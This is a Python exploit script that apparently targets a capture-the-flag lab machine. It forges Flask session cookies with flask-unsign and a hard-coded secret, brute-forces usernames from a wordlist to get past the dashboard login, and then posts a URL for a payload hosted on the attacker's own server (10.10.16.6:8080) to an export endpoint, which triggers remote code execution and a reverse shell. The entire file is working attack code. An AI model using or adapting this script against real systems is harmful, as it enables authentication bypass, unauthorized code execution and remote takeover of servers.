import subprocess
import requests 
import traceback

def GenJwt():
    UserNamesWordlist = "/home/soliman/names2.txt"  # CHANGE ME: https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/Names/names.txt
    for userName in open(UserNamesWordlist):
        userName = userName.strip()
        command = [
            "flask-unsign",
            "--sign",
            "--cookie", f"{{'logged_in': True, 'username': '{userName}'}}",
            "--secret", "secret123"
        ]
        try:
            result = subprocess.check_output(command, text=True)
            jwt = result.strip()
            cookies = {"session": jwt}
            try: 
                r = requests.get("http://10.10.11.160:5000/dashboard", cookies=cookies)
                if r.status_code == 200 and "Welcome" in r.text:
                    print(f"[+] Username: {userName} whose JWT: {jwt} is a \033[92mVALID\033[0m user")
                    return jwt
                    break
                print(f"[-] Username {userName} whose JWT {jwt} is \033[91mNOT VALID\033[0m")

            except Exception as e:
                print("[-] An Error occured: ", e)
                traceback.print_exc()

        except subprocess.CalledProcessError as e:
            print(f"[-] Error for {userName}: {e}")

def RevShell():
    print("[*] Please edit and host the rce.txt file on a Python server on port 8080")
    try:
        url = "http://10.10.11.160:5000/export_note_remote"
        cookies = {"session": GenJwt()}
        data = {"url": "http://10.10.16.6:8080/rce.md"}
        print("[*] Triggering the Revese Shell...")
        print("[+] Check your listener!")
        requests.post(url, cookies=cookies, data=data)
        print("Revese Shell triggerd succefully.")
    except Exception as e:
        print("[-] Error triggering the reverse shell: ", e)
        traceback.print_exc()

def main():
    RevShell()

if __name__ == "__main__":
    main()
